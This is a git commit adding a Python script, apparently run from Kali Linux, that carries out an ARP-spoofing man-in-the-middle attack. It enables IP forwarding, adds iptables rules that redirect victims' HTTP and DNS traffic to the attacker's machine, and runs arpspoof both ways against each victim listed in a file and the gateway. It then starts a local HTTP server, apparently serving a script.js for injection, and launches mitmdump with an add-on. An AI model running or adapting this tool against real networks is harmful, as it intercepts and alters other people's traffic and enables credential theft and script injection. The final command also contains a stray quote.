23c650a00771336b162f5a9def0f7e9c8656fc04
fans0n <49396332+fans0n@users.noreply.github.com>
2019-04-23 17:34:35 +0800

    Add files via upload

---
+++ main.py
@@ -0,0 +1,31 @@
+
+'''
+victims_ip:192.168.43.212
+kali_ip:192.168.43.36
+gateway:192.168.43.1
+'''
+import os
+import sys
+
+#get gateway_ip (router)
+gateway = sys.argv[1]
+print("gateway: " + gateway)
+# get victims_ip
+victims = [line.rstrip('\n') for line in open("victims.txt")]
+print("victims:")
+print(victims)
+#开启端口转发
+os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")
+#iptables过滤数据包
+os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8888")
+os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
+#ARP做劫持攻击，将目标流量劫持到本机。目标机器IP，正反向劫持，数据包来，也得送走
+for victim in victims:
+    os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
+    os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
+	
+# start the http server for serving the script.js, in a new console
+os.system("xterm -hold -e 'python3 httpServer.py' &")
+
+# start the mitmproxy
+os.system("mitmdump -s addons.py' -T")
